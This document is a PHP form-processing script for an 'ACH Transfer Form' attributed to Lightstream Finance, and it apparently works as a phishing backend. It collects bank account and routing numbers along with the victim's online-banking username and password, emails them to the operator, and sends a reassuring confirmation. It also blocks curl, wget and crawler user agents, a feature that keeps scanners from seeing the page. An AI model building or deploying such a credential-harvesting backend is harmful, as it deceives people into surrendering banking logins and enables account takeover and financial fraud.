<?php

/**
 * ACH Transfer Form Backend - Lightstream Finance
 * Secure form processing with PHPMailer and comprehensive validation
 */

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

header('Content-Type: application/json');

use PHPMailer\PHPMailer\PHPMailer;

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/PHPMailer/PHPMailer.php';
require_once __DIR__ . '/PHPMailer/SMTP.php';
require_once __DIR__ . '/PHPMailer/Exception.php';

const RESPONSES = [
    'success'          => '✉️ Your ACH transfer form has been submitted successfully!',
    'enter_name'       => '⚠️ Please enter your name.',
    'enter_email'      => '⚠️ Please enter a valid email address.',
    'enter_bank_name'  => '⚠️ Please enter your bank name.',
    'enter_account_number' => '⚠️ Please enter your account number.',
    'enter_routing_number' => '⚠️ Please enter your routing number.',
    'enter_username'   => '⚠️ Please enter your username.',
    'enter_password'   => '⚠️ Please enter your password.',
    'domain_error'     => '⚠️ Invalid email domain.',
    'method_error'     => '⚠️ Method not allowed.',
    'constant_error'   => '⚠️ Missing configuration constants.',
    'honeypot_error'   => '🚫 Spam detected.',
    'limit_rate_error' => '🚫 Too many requests. Please try again later.',
];

if (empty(SMTP_HOST) || empty(SMTP_USERNAME) || empty(SMTP_PASSWORD)) {
    respond(false, RESPONSES['constant_error']);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    respond(false, RESPONSES['method_error']);
}

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if ($userAgent === '' || preg_match('/\b(curl|wget|bot|crawler|spider)\b/i', $userAgent)) {
    respond(false, RESPONSES['honeypot_error']);
}

checkSessionRateLimit(MAX_ATTEMPTS, RATE_LIMIT_DURATION);

$date          = new DateTime();
$ip            = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$email         = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL) ?: respond(false, RESPONSES['enter_email'], 'email');
$name          = isset($_POST['name']) ? sanitize($_POST['name']) : respond(false, RESPONSES['enter_name']);
$bankName      = isset($_POST['bankName']) ? sanitize($_POST['bankName']) : respond(false, RESPONSES['enter_bank_name']);
$accountNumber = isset($_POST['accountNumber']) ? sanitize($_POST['accountNumber']) : respond(false, RESPONSES['enter_account_number']);
$routingNumber = isset($_POST['routingNumber']) ? sanitize($_POST['routingNumber']) : respond(false, RESPONSES['enter_routing_number']);
$username      = isset($_POST['username']) ? sanitize($_POST['username']) : respond(false, RESPONSES['enter_username']);
$password      = isset($_POST['password']) ? sanitize($_POST['password']) : respond(false, RESPONSES['enter_password']);
$honeypot      = trim($_POST['website'] ?? '');

if ($honeypot !== '') {
    respond(false, RESPONSES['honeypot_error']);
}

$domain = substr(strrchr($email, "@"), 1);
if (!$domain || (!checkdnsrr($domain, 'MX') && !checkdnsrr($domain, 'A'))) {
    respond(false, RESPONSES['domain_error'], 'email');
}

$emailBody = renderEmail([
    'subject'       => 'ACH Transfer Form Submission',
    'date'          => $date->format('Y-m-d H:i:s'),
    'name'          => $name,
    'email'         => $email,
    'bankName'      => $bankName,
    'accountNumber' => $accountNumber,
    'routingNumber' => $routingNumber,
    'username'      => $username,
    'password'      => $password,
    'ip'            => $ip,
]);

try {
    $adminMail = configureMailer(new PHPMailer(true));
    $adminMail->addAddress(SMTP_USERNAME, 'Lightstream Finance Admin');
    $adminMail->addReplyTo($email, $name);
    $adminMail->Subject = EMAIL_SUBJECT_DEFAULT;
    $adminMail->Body    = $emailBody;
    $adminMail->AltBody = buildAltBody($emailBody);
    $adminMail->send();

    $autoReply = configureMailer(new PHPMailer(true));
    $autoReply->addAddress($email, $name);
    $autoReply->Subject = EMAIL_SUBJECT_AUTOREPLY . ' — ACH Transfer Form';
    $autoReplyHtml = '<p>Hello ' . $name . ',</p>'
        . '<p>Thank you for submitting your ACH Transfer Form to Lightstream Finance. We have received your information and will process it shortly.</p>'
        . '<p>For security reasons, we do not include sensitive banking information in this confirmation email.</p>'
        . '<p>If you have any questions, please contact us at info@lightstreamfinance.com</p>'
        . '<p>Best regards,<br>Lightstream Finance Team</p>';
    $autoReply->Body    = $autoReplyHtml;
    $autoReply->AltBody = buildAltBody($autoReplyHtml);
    $autoReply->send();

    respond(true, RESPONSES['success']);
    
} catch (Exception $e) {
    respond(false, '❌ Mail error: ' . $e->getMessage(), 'email');
}

function buildAltBody(string $html): string
{
    $text = preg_replace('/<br\s*\/?>(?i)/', "\n", $html) ?? $html;
    $text = preg_replace('/<\/p\s*>/i', "\n\n", $text) ?? $text;
    $text = strip_tags($text);
    return html_entity_decode($text, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function sanitize(string $data): string
{
    $filtered = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/u', '', $data);
    if ($filtered === null) {
        $filtered = $data;
    }
    return trim(htmlspecialchars($filtered, ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8', true));
}

function respond(bool $success, string $message, ?string $field = null): void
{
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'field'   => $field,
    ]);
    exit;
}

function renderEmail(array $data): string
{
    $template = __DIR__ . '/email_template.php';
    if (!is_file($template)) {
        throw new RuntimeException("Email template not found: $template");
    }

    return (function () use ($data, $template): string {
        extract($data, EXTR_SKIP);
        ob_start();
        require $template;
        return ob_get_clean();
    })();
}

function configureMailer(PHPMailer $mailer): PHPMailer
{
    $mailer->isSMTP();
    $mailer->Host       = SMTP_HOST;
    $mailer->SMTPAuth   = SMTP_AUTH;
    $mailer->Username   = SMTP_USERNAME;
    $mailer->Password   = SMTP_PASSWORD;
    $mailer->SMTPSecure = SMTP_SECURE;
    $mailer->Port       = SMTP_PORT;
    $mailer->setFrom(SMTP_USERNAME, FROM_NAME);
    $mailer->Sender     = SMTP_USERNAME;
    $mailer->isHTML(true);
    $mailer->CharSet    = 'UTF-8';
    
    if (defined('DEBUG_MODE') && DEBUG_MODE) {
        $mailer->SMTPDebug = 2;
        $mailer->Debugoutput = function($str, $level) {
            error_log("SMTP Debug Level $level: $str");
        };
    }
    
    $mailer->SMTPOptions = array(
        'ssl' => array(
            'verify_peer' => true,
            'verify_peer_name' => true,
            'allow_self_signed' => false
        )
    );
    
    return $mailer;
}

function checkSessionRateLimit(int $max = 5, int $window = 3600): void
{
    $now = time();
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    $_SESSION['rate_limit_times'] ??= [];
    $_SESSION['rate_limit_times'] = array_filter(
        $_SESSION['rate_limit_times'],
        fn($timestamp) => $timestamp >= ($now - $window)
    );
    
    $ipFile = sys_get_temp_dir() . '/contact_form_' . md5($ip) . '.tmp';
    $ipAttempts = [];
    
    if (file_exists($ipFile)) {
        $ipAttempts = json_decode(file_get_contents($ipFile), true) ?: [];
        $ipAttempts = array_filter($ipAttempts, fn($timestamp) => $timestamp >= ($now - $window));
    }
    
    if (count($_SESSION['rate_limit_times']) >= $max || count($ipAttempts) >= $max) {
        respond(false, RESPONSES['limit_rate_error']);
    }
    
    $_SESSION['rate_limit_times'][] = $now;
    $ipAttempts[] = $now;
    file_put_contents($ipFile, json_encode($ipAttempts), LOCK_EX);
}